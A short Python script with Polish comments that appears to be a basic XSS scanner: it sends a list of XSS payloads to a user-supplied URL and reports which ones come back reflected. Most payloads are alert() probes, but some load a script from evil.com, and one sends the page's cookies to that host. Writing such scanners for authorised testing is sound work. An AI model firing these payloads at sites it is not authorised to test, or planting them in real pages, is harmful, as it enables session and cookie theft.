import requests

payloady = [
    "<script>alert('XSS1')</script>",
    "<img src=x onerror=alert(2)>",
    "<svg/onload=alert(3)>",
    "<script>document.location='javascript:alert(4)'</script>",
    "<iframe src='javascript:alert(5)'></iframe>",
    "<body onload=alert(6)>",
    "<div style='background-image: url(javascript:alert(7))'>",
    "<script src='http://evil.com/xss.js'></script>",
    "<a href='javascript:alert(8)'>Click me</a>",
    "<marquee onstart='alert(9)'>Scrolling text</marquee>",
    "<script src=//evil.com/xss.js></script>",
    "<input type='image' src='x' onerror='alert(10)'>",
    "<script>alert(document.cookie)</script>",
    "<script>eval(String.fromCharCode(88,83,83))</script>",
    "<img src='x' onerror='this.src=\"//evil.com/hacked.jpg\"'>",
    "<script>window.location='http://evil.com?cookie=' + document.cookie;</script>",
    "<script>alert('<img src=x onerror=alert(11)>')</script>"
]

def testXSS(link, payloady):
    """
    Ta funkcja wysyła żądania ze złośliwymi payloadami JavaScript na podany adres URL, aby
    przetestować podatności na ataki XSS.

    Argumenty:
    link (str): adres aplikacji internetowej do przetestowania.
    payloady (list): lista złośliwych payloadów JavaScript używanych do testowania podatności na ataki XSS.
    """
    for payload in payloady:
        odpowiedz = requests.get(link, params={"input": payload})

        if payload in odpowiedz.text:
            print(f"Możliwa podatność na atak XSS dla payloadu: {payload}")
        else:
            print(f"Payload {payload} wydaje się być bezpieczny.")

link = input("Podaj link do aplikacji webowej którą chesz przetestować pod kątem ataku XSS: ")

testXSS(link, payloady)
